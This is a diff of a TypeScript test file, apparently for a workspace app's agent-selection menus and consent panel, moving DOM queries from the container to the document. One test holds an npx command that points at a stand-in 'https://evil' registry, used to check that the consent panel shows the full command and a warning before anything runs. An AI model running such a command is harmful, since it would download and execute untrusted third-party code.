@@ -473,9 +473,10 @@ function deferred<T>(): { promise: Promise<T>; resolve: (value: T) => void } {
 
 /** The + menu's entry: every strip flow opens the menu and picks from it. */
 function newTabMenuItem(container: HTMLElement, label: string): HTMLButtonElement {
-  const item = [...container.querySelectorAll<HTMLButtonElement>("[role='menuitem']")].find(
-    (button) => button.textContent === label,
-  );
+  // The menu portals to the document — the container's own document hosts it.
+  const item = [
+    ...container.ownerDocument.querySelectorAll<HTMLButtonElement>("[role='menuitem']"),
+  ].find((button) => button.textContent === label);
   if (item === undefined) throw new Error(`+ menu item did not render: ${label}`);
   return item;
 }
@@ -1064,7 +1065,7 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     expect(sessionCreate).not.toHaveBeenCalled();
-    const menu = container.querySelector('[aria-label="Choose agent"]');
+    const menu = document.querySelector('[aria-label="Choose agent"]');
     if (menu === null) throw new Error("provider popover did not render");
     expect(menu.textContent).toContain("grok");
     expect(menu.textContent).toContain("claude");
@@ -1080,7 +1081,7 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "claude");
-    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
   });
 
   it("creates immediately with the only chat-capable provider", async () => {
@@ -1099,7 +1100,7 @@ describe("Workspace sessions", () => {
     await act(async () => newWorkspace.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
     expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "grok");
   });
 
@@ -1117,10 +1118,10 @@ describe("Workspace sessions", () => {
     await act(async () => newWorkspace.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
     expect(sessionCreate).not.toHaveBeenCalled();
 
-    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
+    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
     if (confirm === null) throw new Error("Confirm button did not render");
     await act(async () => confirm.click());
     await act(async () => undefined);
@@ -1170,7 +1171,7 @@ describe("Workspace sessions", () => {
     await act(async () => newWorkspace.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
     expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp");
   });
 
@@ -1189,13 +1190,13 @@ describe("Workspace sessions", () => {
     if (newWorkspace === null) throw new Error("new workspace control did not render");
     await act(async () => newWorkspace.click());
     await act(async () => undefined);
-    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
 
     await act(async () => {
       window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
     });
 
-    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
     expect(sessionCreate).not.toHaveBeenCalled();
   });
 
@@ -1252,13 +1253,13 @@ describe("Workspace sessions", () => {
     if (newWorkspace === null) throw new Error("new workspace control did not render");
     await act(async () => newWorkspace.click());
     await act(async () => undefined);
-    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
 
     await act(async () => {
       document.body.dispatchEvent(new MouseEvent("mousedown", { bubbles: true }));
     });
 
-    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
     expect(sessionCreate).not.toHaveBeenCalled();
   });
 
@@ -1989,18 +1990,18 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     const codexOption = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
     ).find((button) => button.textContent?.includes("codex-acp"));
     if (codexOption === undefined) throw new Error("codex-acp option did not render");
     await act(async () => codexOption.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
-    expect(container.textContent).toContain("@agentclientprotocol/codex-acp@1.10.0");
-    expect(container.textContent).toContain(
+    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
+    expect(document.body.textContent).toContain("@agentclientprotocol/codex-acp@1.10.0");
+    expect(document.body.textContent).toContain(
       "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
     );
-    expect(container.textContent).toContain("npx will download and run third-party code");
+    expect(document.body.textContent).toContain("npx will download and run third-party code");
     expect(sessionCreate).not.toHaveBeenCalled();
   });
 
@@ -2021,7 +2022,7 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     const codexOption = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
     ).find((button) => button.textContent?.includes("codex-acp"));
     if (codexOption === undefined) throw new Error("codex-acp option did not render");
     await act(async () => codexOption.click());
@@ -2033,7 +2034,7 @@ describe("Workspace sessions", () => {
     // attribute exists: the spoken words are the thing under test, and an
     // aria-describedby pointing at a missing or empty node announces nothing
     // while still satisfying an attribute check.
-    const confirm = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
+    const confirm = Array.from(document.querySelectorAll<HTMLButtonElement>("button")).find(
       (button) => button.textContent?.trim() === "Confirm",
     );
     if (confirm === undefined) throw new Error("Confirm did not render");
@@ -2042,7 +2043,7 @@ describe("Workspace sessions", () => {
     const described = (confirm.getAttribute("aria-describedby") ?? "")
       .split(/\s+/)
       .filter((id) => id.length > 0)
-      .map((id) => container.querySelector(`#${id}`)?.textContent ?? "")
+      .map((id) => document.querySelector(`#${id}`)?.textContent ?? "")
       .join(" ");
 
     expect(described).toContain(
@@ -2072,21 +2073,21 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     const codexOption = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
     ).find((button) => button.textContent?.includes("codex-acp"));
     if (codexOption === undefined) throw new Error("codex-acp option did not render");
     await act(async () => codexOption.click());
     await act(async () => undefined);
 
-    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
+    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
     if (confirm === null) throw new Error("Confirm button did not render");
     await act(async () => confirm.click());
     await act(async () => undefined);
 
     expect(sessionCreate).toHaveBeenCalledTimes(1);
     expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "codex-acp");
-    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).toBeNull();
   });
 
   it("Cancel on consent panel returns to option list without creating", async () => {
@@ -2106,22 +2107,22 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     const codexOption = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
     ).find((button) => button.textContent?.includes("codex-acp"));
     if (codexOption === undefined) throw new Error("codex-acp option did not render");
     await act(async () => codexOption.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
     const cancel = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-secondary-action"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-secondary-action"),
     ).find((button) => button.textContent === "Cancel");
     if (cancel === undefined) throw new Error("Cancel button did not render");
     await act(async () => cancel.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
     expect(sessionCreate).not.toHaveBeenCalled();
   });
 
@@ -2142,20 +2143,20 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     const codexOption = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
     ).find((button) => button.textContent?.includes("codex-acp"));
     if (codexOption === undefined) throw new Error("codex-acp option did not render");
     await act(async () => codexOption.click());
     await act(async () => undefined);
 
-    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
 
     await act(async () => {
       window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
     });
 
-    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
-    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
+    expect(document.querySelector('[aria-label="Confirm agent"]')).toBeNull();
+    expect(document.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
     expect(sessionCreate).not.toHaveBeenCalled();
   });
 
@@ -2180,13 +2181,13 @@ describe("Workspace sessions", () => {
     await act(async () => undefined);
 
     const codexOption = Array.from(
-      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
+      document.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
     ).find((button) => button.textContent?.includes("codex-acp"));
     if (codexOption === undefined) throw new Error("codex-acp option did not render");
     await act(async () => codexOption.click());
     await act(async () => undefined);
 
-    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
+    const confirm = document.querySelector<HTMLButtonElement>(".workspace-primary-action");
     if (confirm === null) throw new Error("Confirm button did not render");
     const rowsBefore = container.querySelectorAll(".workspace-row").length;
     await act(async () => {
